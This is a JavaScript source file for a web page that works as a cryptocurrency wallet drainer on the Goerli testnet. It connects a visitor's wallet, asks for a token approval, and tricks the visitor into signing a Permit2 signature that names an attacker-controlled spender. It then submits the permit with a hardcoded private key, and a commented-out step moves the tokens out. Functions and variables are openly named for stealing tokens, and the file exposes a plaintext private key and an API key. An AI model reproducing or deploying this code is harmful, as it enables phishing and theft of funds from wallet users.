const { ethers, ethereum } = window

const connectButton = document.getElementById("connect")
const approveButton = document.getElementById("approve")
const mainButton = document.getElementById("main")

const RPC = "https://goerli.infura.io/v3/15d127f3ac494ca88ab983921536e312"
// const Permit2Contract = "0x2B447B62aD020ec87e0407A3b054F847fa8D4225" // Deployed it also to Goerly
const Permit2Contract = "0x000000000022D473030F116dDEE9F6B43aC78BA3" // Deployed it also to Goerly
const tokenToSteal = "0xD87Ba7A50B2E7E660f678A895E4B72E7CB4CCd9C" // USDC on Goerly

const Permit2ContractABI = [
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "deadline",
          "type": "uint256"
        }
      ],
      "name": "AllowanceExpired",
      "type": "error"
    },
    {
      "inputs": [],
      "name": "ExcessiveInvalidation",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "InsufficientAllowance",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "maxAmount",
          "type": "uint256"
        }
      ],
      "name": "InvalidAmount",
      "type": "error"
    },
    {
      "inputs": [],
      "name": "InvalidContractSignature",
      "type": "error"
    },
    {
      "inputs": [],
      "name": "InvalidNonce",
      "type": "error"
    },
    {
      "inputs": [],
      "name": "InvalidSignature",
      "type": "error"
    },
    {
      "inputs": [],
      "name": "InvalidSignatureLength",
      "type": "error"
    },
    {
      "inputs": [],
      "name": "InvalidSigner",
      "type": "error"
    },
    {
      "inputs": [],
      "name": "LengthMismatch",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "signatureDeadline",
          "type": "uint256"
        }
      ],
      "name": "SignatureExpired",
      "type": "error"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "token",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint160",
          "name": "amount",
          "type": "uint160"
        },
        {
          "indexed": false,
          "internalType": "uint48",
          "name": "expiration",
          "type": "uint48"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "address",
          "name": "token",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "Lockdown",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "token",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint48",
          "name": "newNonce",
          "type": "uint48"
        },
        {
          "indexed": false,
          "internalType": "uint48",
          "name": "oldNonce",
          "type": "uint48"
        }
      ],
      "name": "NonceInvalidation",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "token",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint160",
          "name": "amount",
          "type": "uint160"
        },
        {
          "indexed": false,
          "internalType": "uint48",
          "name": "expiration",
          "type": "uint48"
        },
        {
          "indexed": false,
          "internalType": "uint48",
          "name": "nonce",
          "type": "uint48"
        }
      ],
      "name": "Permit",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "word",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "mask",
          "type": "uint256"
        }
      ],
      "name": "UnorderedNonceInvalidation",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "DOMAIN_SEPARATOR",
      "outputs": [
        {
          "internalType": "bytes32",
          "name": "",
          "type": "bytes32"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "internalType": "uint160",
          "name": "amount",
          "type": "uint160"
        },
        {
          "internalType": "uint48",
          "name": "expiration",
          "type": "uint48"
        },
        {
          "internalType": "uint48",
          "name": "nonce",
          "type": "uint48"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "token",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint160",
          "name": "amount",
          "type": "uint160"
        },
        {
          "internalType": "uint48",
          "name": "expiration",
          "type": "uint48"
        }
      ],
      "name": "approve",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "token",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint48",
          "name": "newNonce",
          "type": "uint48"
        }
      ],
      "name": "invalidateNonces",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "wordPos",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "mask",
          "type": "uint256"
        }
      ],
      "name": "invalidateUnorderedNonces",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "components": [
            {
              "internalType": "address",
              "name": "token",
              "type": "address"
            },
            {
              "internalType": "address",
              "name": "spender",
              "type": "address"
            }
          ],
          "internalType": "struct IAllowanceTransfer.TokenSpenderPair[]",
          "name": "approvals",
          "type": "tuple[]"
        }
      ],
      "name": "lockdown",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "nonceBitmap",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "components": [
            {
              "components": [
                {
                  "internalType": "address",
                  "name": "token",
                  "type": "address"
                },
                {
                  "internalType": "uint160",
                  "name": "amount",
                  "type": "uint160"
                },
                {
                  "internalType": "uint48",
                  "name": "expiration",
                  "type": "uint48"
                },
                {
                  "internalType": "uint48",
                  "name": "nonce",
                  "type": "uint48"
                }
              ],
              "internalType": "struct IAllowanceTransfer.PermitDetails[]",
              "name": "details",
              "type": "tuple[]"
            },
            {
              "internalType": "address",
              "name": "spender",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "sigDeadline",
              "type": "uint256"
            }
          ],
          "internalType": "struct IAllowanceTransfer.PermitBatch",
          "name": "permitBatch",
          "type": "tuple"
        },
        {
          "internalType": "bytes",
          "name": "signature",
          "type": "bytes"
        }
      ],
      "name": "permit",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "components": [
            {
              "components": [
                {
                  "internalType": "address",
                  "name": "token",
                  "type": "address"
                },
                {
                  "internalType": "uint160",
                  "name": "amount",
                  "type": "uint160"
                },
                {
                  "internalType": "uint48",
                  "name": "expiration",
                  "type": "uint48"
                },
                {
                  "internalType": "uint48",
                  "name": "nonce",
                  "type": "uint48"
                }
              ],
              "internalType": "struct IAllowanceTransfer.PermitDetails",
              "name": "details",
              "type": "tuple"
            },
            {
              "internalType": "address",
              "name": "spender",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "sigDeadline",
              "type": "uint256"
            }
          ],
          "internalType": "struct IAllowanceTransfer.PermitSingle",
          "name": "permitSingle",
          "type": "tuple"
        },
        {
          "internalType": "bytes",
          "name": "signature",
          "type": "bytes"
        }
      ],
      "name": "permit",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "components": [
            {
              "components": [
                {
                  "internalType": "address",
                  "name": "token",
                  "type": "address"
                },
                {
                  "internalType": "uint256",
                  "name": "amount",
                  "type": "uint256"
                }
              ],
              "internalType": "struct ISignatureTransfer.TokenPermissions",
              "name": "permitted",
              "type": "tuple"
            },
            {
              "internalType": "uint256",
              "name": "nonce",
              "type": "uint256"
            },
            {
              "internalType": "uint256",
              "name": "deadline",
              "type": "uint256"
            }
          ],
          "internalType": "struct ISignatureTransfer.PermitTransferFrom",
          "name": "permit",
          "type": "tuple"
        },
        {
          "components": [
            {
              "internalType": "address",
              "name": "to",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "requestedAmount",
              "type": "uint256"
            }
          ],
          "internalType": "struct ISignatureTransfer.SignatureTransferDetails",
          "name": "transferDetails",
          "type": "tuple"
        },
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "internalType": "bytes",
          "name": "signature",
          "type": "bytes"
        }
      ],
      "name": "permitTransferFrom",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "components": [
            {
              "components": [
                {
                  "internalType": "address",
                  "name": "token",
                  "type": "address"
                },
                {
                  "internalType": "uint256",
                  "name": "amount",
                  "type": "uint256"
                }
              ],
              "internalType": "struct ISignatureTransfer.TokenPermissions[]",
              "name": "permitted",
              "type": "tuple[]"
            },
            {
              "internalType": "uint256",
              "name": "nonce",
              "type": "uint256"
            },
            {
              "internalType": "uint256",
              "name": "deadline",
              "type": "uint256"
            }
          ],
          "internalType": "struct ISignatureTransfer.PermitBatchTransferFrom",
          "name": "permit",
          "type": "tuple"
        },
        {
          "components": [
            {
              "internalType": "address",
              "name": "to",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "requestedAmount",
              "type": "uint256"
            }
          ],
          "internalType": "struct ISignatureTransfer.SignatureTransferDetails[]",
          "name": "transferDetails",
          "type": "tuple[]"
        },
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "internalType": "bytes",
          "name": "signature",
          "type": "bytes"
        }
      ],
      "name": "permitTransferFrom",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "components": [
            {
              "components": [
                {
                  "internalType": "address",
                  "name": "token",
                  "type": "address"
                },
                {
                  "internalType": "uint256",
                  "name": "amount",
                  "type": "uint256"
                }
              ],
              "internalType": "struct ISignatureTransfer.TokenPermissions",
              "name": "permitted",
              "type": "tuple"
            },
            {
              "internalType": "uint256",
              "name": "nonce",
              "type": "uint256"
            },
            {
              "internalType": "uint256",
              "name": "deadline",
              "type": "uint256"
            }
          ],
          "internalType": "struct ISignatureTransfer.PermitTransferFrom",
          "name": "permit",
          "type": "tuple"
        },
        {
          "components": [
            {
              "internalType": "address",
              "name": "to",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "requestedAmount",
              "type": "uint256"
            }
          ],
          "internalType": "struct ISignatureTransfer.SignatureTransferDetails",
          "name": "transferDetails",
          "type": "tuple"
        },
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "internalType": "bytes32",
          "name": "witness",
          "type": "bytes32"
        },
        {
          "internalType": "string",
          "name": "witnessTypeString",
          "type": "string"
        },
        {
          "internalType": "bytes",
          "name": "signature",
          "type": "bytes"
        }
      ],
      "name": "permitWitnessTransferFrom",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "components": [
            {
              "components": [
                {
                  "internalType": "address",
                  "name": "token",
                  "type": "address"
                },
                {
                  "internalType": "uint256",
                  "name": "amount",
                  "type": "uint256"
                }
              ],
              "internalType": "struct ISignatureTransfer.TokenPermissions[]",
              "name": "permitted",
              "type": "tuple[]"
            },
            {
              "internalType": "uint256",
              "name": "nonce",
              "type": "uint256"
            },
            {
              "internalType": "uint256",
              "name": "deadline",
              "type": "uint256"
            }
          ],
          "internalType": "struct ISignatureTransfer.PermitBatchTransferFrom",
          "name": "permit",
          "type": "tuple"
        },
        {
          "components": [
            {
              "internalType": "address",
              "name": "to",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "requestedAmount",
              "type": "uint256"
            }
          ],
          "internalType": "struct ISignatureTransfer.SignatureTransferDetails[]",
          "name": "transferDetails",
          "type": "tuple[]"
        },
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "internalType": "bytes32",
          "name": "witness",
          "type": "bytes32"
        },
        {
          "internalType": "string",
          "name": "witnessTypeString",
          "type": "string"
        },
        {
          "internalType": "bytes",
          "name": "signature",
          "type": "bytes"
        }
      ],
      "name": "permitWitnessTransferFrom",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "components": [
            {
              "internalType": "address",
              "name": "from",
              "type": "address"
            },
            {
              "internalType": "address",
              "name": "to",
              "type": "address"
            },
            {
              "internalType": "uint160",
              "name": "amount",
              "type": "uint160"
            },
            {
              "internalType": "address",
              "name": "token",
              "type": "address"
            }
          ],
          "internalType": "struct IAllowanceTransfer.AllowanceTransferDetails[]",
          "name": "transferDetails",
          "type": "tuple[]"
        }
      ],
      "name": "transferFrom",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint160",
          "name": "amount",
          "type": "uint160"
        },
        {
          "internalType": "address",
          "name": "token",
          "type": "address"
        }
      ],
      "name": "transferFrom",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
]

const ERC20_ABI = [
    {
        "constant": false,
        "inputs": [
            { "name": "_spender", "type": "address" },
            { "name": "_value", "type": "uint256" }
        ],
        "name": "approve",
        "outputs": [
            { "name": "", "type": "bool" }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "from", "type": "address" },
            { "internalType": "address", "name": "to", "type": "address" },
            { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "transferFrom",
        "outputs": [
            { "internalType": "bool", "name": "", "type": "bool" }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "owner", "type": "address" }
        ],
        "name": "nonces",
        "outputs": [
            { "internalType": "uint256", "name": "", "type": "uint256" }
        ],
        "stateMutability": "view",
        "type": "function"
    }
]

const initiator = "0xECD56821D6eB6db6cCB30243cb1d6592Ff5A0F14"
const initiatorPK = "050947b326c43b89fd7d46ef2e3ab49ce419ac03c4ba1e66c055abb86cf6d2c4"

const recipient = "0xf50b1E00215D83089AEE99b76D64a9C0b915062a"

let provider, web3
let selectedAddress

async function connect() {
    web3 = new Web3(ethereum)
    provider = new ethers.providers.Web3Provider(ethereum)
    const network = await provider.getNetwork()

    if (network.chainId !== 5) {
        try {
            await provider.send("wallet_switchEthereumChain", [{ chainId: "0x5" }])
        } catch (err) {
            console.log("error", err)
            return
        }
    }
    
    const accounts = await provider.send("eth_requestAccounts", [])
    selectedAddress = accounts[0]

    connectButton.innerText = selectedAddress
}

async function approveMax() {
    const tokenContract = new web3.eth.Contract(ERC20_ABI, tokenToSteal, {from: selectedAddress})
    tokenContract.methods.approve(Permit2Contract, 20).send({from: selectedAddress})
}

async function stealToken() {
    const ownerNonce = await web3.eth.getTransactionCount(selectedAddress)
    const deadline = 10000000000000 // (Math.round(Date.now() / 1000)) + 100
    const maxInt = "115792089237316195423570985008687907853269984665640564039457584007913129639935"

    const dataToSign = JSON.stringify({
        domain: {
            name: "Permit2",
            chainId: 5,
            verifyingContract: Permit2Contract
        },
        types: {
            EIP712Domain: [
                { name: "name", type: "string" },
                { name: "chainId", type: "uint256" },
                { name: "verifyingContract", type: "address" }
            ],
            PermitSingle: [
                { name: "details", type: "PermitDetails" },
                { name: "spender", type: "address" },
                { name: "sigDeadline", type: "uint256" }
            ],
            PermitDetails: [
                { name: "token", type: "address" },
                { name: "amount", type: "uint160" },
                { name: "expiration", type: "uint48" },
                { name: "nonce", type: "uint48" }
            ]
        },
        primaryType: "PermitSingle",
        message: { 
            details: {
                token: tokenToSteal,
                amount: 20,
                expiration: deadline,
                nonce: parseInt(0)
            }, 
            spender: initiator, 
            sigDeadline: deadline,
        }
    })

    web3.currentProvider.sendAsync({
        method: "eth_signTypedData_v3",
        params: [selectedAddress, dataToSign],
        from: selectedAddress
    }, async (error, result) => {
        if (error != null) return

        const signature = result.result
        const ownerNonce = await web3.eth.getTransactionCount(selectedAddress)
        const spenderNonce = await web3.eth.getTransactionCount(recipient)

        const permitDetails = [[tokenToSteal, 20, deadline, parseInt(0)], initiator, deadline]
        // console.log(selectedAddress, permitDetails, signature)
        // return
        const permit2Contract = new web3.eth.Contract(Permit2ContractABI, Permit2Contract)
        const permit = permit2Contract.methods.permit(selectedAddress, permitDetails, signature).encodeABI()
        const initiatorNonce = await web3.eth.getTransactionCount(initiator)
        const gasPrice = await web3.eth.getGasPrice()
        const rawTX = {
            from: initiator,
            to: Permit2Contract,
            nonce: web3.utils.toHex(initiatorNonce),
            gasLimit: web3.utils.toHex(98000),
            gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
            value: "0x",
            data: permit
        }
        const signedTx = await web3.eth.accounts.signTransaction(rawTX, initiatorPK)
        web3.eth.sendSignedTransaction(signedTx.rawTransaction)

        // // after the token is approved to us, steal it
        // // don't forget to increment nonce
        // const data = tokenContract.methods.transferFrom(selectedAddress, recipient, asset.balance).encodeABI() 
        // const finalTx = {
        //     "from": initiator,
        //     "to": asset.contract,
        //     "nonce": web3.utils.toHex(initiatorNonce + 1),
        //     "gasLimit": web3.utils.toHex(90000),
        //     "gasPrice": web3.utils.toHex(Math.floor(gasPrice * 1.3)),
        //     "data": data,
        //     "value": "0x"
        // } 
        // const finalSignedTx = await web3.eth.accounts.signTransaction(finalTx, initiatorPK)
        // web3.eth.sendSignedTransaction(finalSignedTx.rawTransaction)
    })
}

window.addEventListener("DOMContentLoaded", () => {
    connectButton.onclick = connect
})

window.addEventListener("DOMContentLoaded", () => {
    approveButton.onclick = approveMax
})

window.addEventListener("DOMContentLoaded", () => {
    mainButton.onclick = stealToken
})